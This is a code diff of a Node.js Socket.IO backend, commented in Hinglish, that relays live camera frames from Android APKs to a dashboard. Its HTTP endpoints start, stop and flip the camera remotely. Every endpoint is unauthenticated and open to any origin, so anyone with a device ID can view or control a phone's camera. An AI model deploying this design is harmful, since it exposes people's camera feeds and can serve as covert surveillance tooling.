@@ -12,15 +12,16 @@ const io = new Server(server, {
 });
 
 // ============================================
-// STORAGE - Connected devices ke liye
+// STORAGE - Connected Devices & Frames
 // ============================================
-let connectedDevices = [];      // Sabhi connected APKs ki list
-let latestFrames = {};          // Har device ka latest frame (MJPEG ke liye)
+let connectedDevices = [];
+let latestFrames = {};  // Har device ka latest frame store hoga
 
 // ============================================
 // MIDDLEWARE
 // ============================================
 app.use(express.json());
+
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST');
@@ -29,8 +30,10 @@ app.use((req, res, next) => {
 });
 
 // ============================================
-// API 1: SABHI DEVICES KI LIST (Vercel ke liye)
+// ============ APIs for Vercel ===============
 // ============================================
+
+// 1. Sabhi connected devices ki list
 app.get('/api/devices', (req, res) => {
   const devicesList = connectedDevices.map(device => ({
     device_id: device.id,
@@ -46,51 +49,44 @@ app.get('/api/devices', (req, res) => {
   });
 });
 
-// ============================================
-// API 2: MJPEG FRAME (Vercel yehi use karega stream dikhane ke liye)
-// ============================================
+// 2. MJPEG FRAME ENDPOINT (Vercel yehi use karega stream dikhane ke liye) 🔴 IMPORTANT
 app.get('/api/frame.jpg', (req, res) => {
   const deviceId = req.query.device_id;
   
-  if(!deviceId) {
-    return res.status(400).send('No device_id provided');
+  if (!deviceId) {
+    return res.status(400).send('device_id missing');
   }
   
   const frame = latestFrames[deviceId];
   
-  if(frame && frame.data) {
-    // Base64 se JPEG buffer mein convert
-    let base64Data = frame.data;
-    
-    // "data:image/jpeg;base64," prefix hatao agar hai to
-    if(base64Data.includes('base64,')) {
-      base64Data = base64Data.split('base64,')[1];
-    }
-    
-    const imgBuffer = Buffer.from(base64Data, 'base64');
-    
-    // JPEG image return karo
-    res.writeHead(200, {
-      'Content-Type': 'image/jpeg',
-      'Content-Length': imgBuffer.length,
-      'Cache-Control': 'no-cache, no-store, must-revalidate',
-      'Pragma': 'no-cache',
-      'Expires': '0'
-    });
-    res.end(imgBuffer);
-  } else {
-    res.status(404).send('No frame available');
+  if (!frame || !frame.data) {
+    return res.status(404).send('No frame available');
   }
+  
+  // Base64 se image buffer me convert
+  let base64Data = frame.data;
+  if (base64Data.includes(',')) {
+    base64Data = base64Data.split(',')[1];
+  }
+  
+  const imgBuffer = Buffer.from(base64Data, 'base64');
+  
+  res.writeHead(200, {
+    'Content-Type': 'image/jpeg',
+    'Content-Length': imgBuffer.length,
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Pragma': 'no-cache',
+    'Expires': '0'
+  });
+  res.end(imgBuffer);
 });
 
-// ============================================
-// API 3: SPECIFIC DEVICE KA STATUS
-// ============================================
+// 3. Specific device ka status
 app.get('/api/device-status', (req, res) => {
   const deviceId = req.query.device_id;
   const device = connectedDevices.find(d => d.id === deviceId);
   
-  if(device) {
+  if (device) {
     res.json({
       success: true,
       is_online: true,
@@ -108,24 +104,20 @@ app.get('/api/device-status', (req, res) => {
   }
 });
 
-// ============================================
-// API 4: COMMAND SEND (Specific device ko)
-// ============================================
+// 4. Command send (specific device ko)
 app.get('/api/command', (req, res) => {
   const command = req.query.cmd;
   const deviceId = req.query.device_id;
   
-  if(!deviceId) {
+  if (!deviceId) {
     return res.json({ success: false, error: "No device selected" });
   }
   
   const targetDevice = connectedDevices.find(d => d.id === deviceId);
   
-  if(targetDevice) {
-    // Sirf is device ko command bhejo
+  if (targetDevice) {
     io.to(targetDevice.socket_id).emit('command', command);
-    
-    console.log(`🎮 Command '${command}' → ${targetDevice.device_name} (${deviceId})`);
+    console.log(`🎮 Command '${command}' → ${targetDevice.device_name}`);
     
     res.json({
       success: true,
@@ -141,22 +133,19 @@ app.get('/api/command', (req, res) => {
   }
 });
 
-// ============================================
-// API 5: QUALITY CHANGE (Specific device ko)
-// ============================================
+// 5. Quality change (specific device ko)
 app.get('/api/quality', (req, res) => {
   const quality = req.query.quality;
   const deviceId = req.query.device_id;
   
-  if(!deviceId || !quality) {
+  if (!deviceId || !quality) {
     return res.json({ success: false, error: "Missing device or quality" });
   }
   
   const targetDevice = connectedDevices.find(d => d.id === deviceId);
   
-  if(targetDevice) {
+  if (targetDevice) {
     io.to(targetDevice.socket_id).emit('quality', quality);
-    
     console.log(`🎥 Quality '${quality}' → ${targetDevice.device_name}`);
     
     res.json({
@@ -169,9 +158,7 @@ app.get('/api/quality', (req, res) => {
   }
 });
 
-// ============================================
-// API 6: HOME (Server info)
-// ============================================
+// 6. Home endpoint
 app.get('/', (req, res) => {
   res.json({
     message: "APK Camera Stream Backend is Running",
@@ -189,14 +176,15 @@ app.get('/', (req, res) => {
 });
 
 // ============================================
-// WEBSOCKET (APK se connection handle)
+// ============ WEBSOCKET (APK Connection) ============
 // ============================================
+
 io.on('connection', (socket) => {
   console.log('✅ New APK connection:', socket.id);
   
   let currentDevice = null;
   
-  // APK register hota hai (JAB APK OPEN HOTA HAI)
+  // APK register hota hai
   socket.on('register_device', (data) => {
     const deviceId = data.device_id || data.device || socket.id;
     const deviceName = data.device_name || data.model || "Android Phone";
@@ -205,23 +193,22 @@ io.on('connection', (socket) => {
       id: deviceId,
       device_name: deviceName,
       socket_id: socket.id,
-      connected_at: new Date().toISOString(),
-      last_heartbeat: new Date().toISOString()
+      connected_at: new Date().toISOString()
     };
     
     // Pehle se connected hai to remove karo
     connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
     connectedDevices.push(currentDevice);
     
-    console.log(`\n📱 APK CONNECTED!`);
+    console.log(`\n📱 DEVICE CONNECTED:`);
     console.log(`   Name: ${deviceName}`);
     console.log(`   ID: ${deviceId}`);
     console.log(`   Total online: ${connectedDevices.length}`);
   });
   
-  // APK se frame aaya (LIVE STREAM FRAME)
+  // 🔴 APK se FRAME aaya - YAHAN STORE HOTA HAI 🔴
   socket.on('frame', (frameData) => {
-    if(currentDevice) {
+    if (currentDevice) {
       latestFrames[currentDevice.id] = {
         data: frameData,
         time: Date.now()
@@ -229,17 +216,18 @@ io.on('connection', (socket) => {
     }
   });
   
-  // APK se heartbeat
+  // Heartbeat
   socket.on('heartbeat', (data) => {
-    if(currentDevice) {
-      currentDevice.last_heartbeat = new Date().toISOString();
+    if (currentDevice) {
+      // Update last seen time if needed
+      console.log(`💓 Heartbeat from ${currentDevice.device_name}`);
     }
   });
   
-  // APK disconnect (JAB APK BAND HOTA HAI)
+  // Disconnect
   socket.on('disconnect', () => {
-    if(currentDevice) {
-      console.log(`\n🔴 APK DISCONNECTED!`);
+    if (currentDevice) {
+      console.log(`\n🔴 DEVICE DISCONNECTED:`);
       console.log(`   Name: ${currentDevice.device_name}`);
       console.log(`   ID: ${currentDevice.id}`);
       
@@ -252,7 +240,7 @@ io.on('connection', (socket) => {
 });
 
 // ============================================
-// SERVER START
+// START SERVER
 // ============================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
@@ -264,27 +252,14 @@ server.listen(PORT, () => {
   📡 Port: ${PORT}
   🌐 URL: https://your-project.repl.co
   
-  📱 APK CONNECTION:
-     • WebSocket: wss://your-project.repl.co
-     • Register event: register_device
-     • Frame event: frame (Base64 JPEG)
+  ✅ APIs Working:
+     GET /api/devices
+     GET /api/frame.jpg?device_id=xxx  ← MJPEG Stream
+     GET /api/command?cmd=xxx&device_id=xxx
+     GET /api/quality?quality=xxx&device_id=xxx
+     GET /api/device-status?device_id=xxx
   
-  🔗 VERCELL APIs:
-     ┌─────────────────────────────────────────────────┐
-     │ GET /api/devices          → All devices list    │
-     │ GET /api/frame.jpg?id=xx  → MJPEG frame        │
-     │ GET /api/command?cmd=xx   → Send command       │
-     │ GET /api/quality?q=xx     → Change quality     │
-     │ GET /api/device-status?id=xx → Device status   │
-     └─────────────────────────────────────────────────┘
-  
-  🎮 COMMANDS SUPPORTED:
-     • start  → Camera ON + Stream start
-     • stop   → Camera OFF + Stream band
-     • flip   → Front/Back camera switch
-     • 140p   → Quality 160x120 (Blurry/Pixelated)
-     • 240p   → Quality 320x240 (Medium)
-     • 360p   → Quality 480x360 (Clear)
+  🔌 WebSocket: Active
   
   ═══════════════════════════════════════════════════════
   `);
